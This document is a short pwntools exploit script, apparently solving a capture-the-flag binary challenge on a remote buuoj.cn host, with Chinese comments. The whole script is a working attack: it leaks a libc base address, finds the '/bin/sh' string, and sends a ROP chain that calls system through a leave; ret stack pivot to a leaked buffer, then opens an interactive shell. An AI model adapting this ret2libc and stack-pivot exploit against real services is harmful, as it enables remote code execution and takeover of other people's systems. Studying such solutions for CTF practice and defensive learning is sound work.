from pwn import *
context.update(os='linux',arch='amd64',log_level='debug')
binary='./pwn'
elf=ELF(binary)
libc=ELF('./libc.so.6')
debug=0
if debug:
	libc=elf.libc
	p=process(binary)
else:
	host='node4.buuoj.cn'
	port='28272'
	p=remote(host,port)

ret=0x40101a
pop_rdi_ret=0x401333
leave_ret=0x4012AA

p.sendafter("your name:\n", b'a'*8)
p.recvuntil('a'*8)

libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - libc.sym["_IO_file_jumps"] #通过泄露获取libc基地址

binsh = next(libc.search(b"/bin/sh"))#寻找/bin/sh字符串
success("libc-->" + hex(libc.address))

p.recvuntil("I have a small gift for you: ")

rop_addr=int(p.recv(14),16)+8#$p buf+8
success("rop_addr-->" + hex(rop_addr))

p.recvuntil("more infomation plz:\n")

pay = p64(pop_rdi_ret) + p64(binsh) + p64(libc.sym["system"])
pay = pay.ljust(0x50, b'\x00')#对齐50位数
pay += p64(rop_addr - 8)#$p buf
pay += p64(leave_ret)#poprid+binsh+system+aaaaaa*n+$p-buf+leave
                                                  #ebp^ esp^    
p.send(pay)
p.interactive()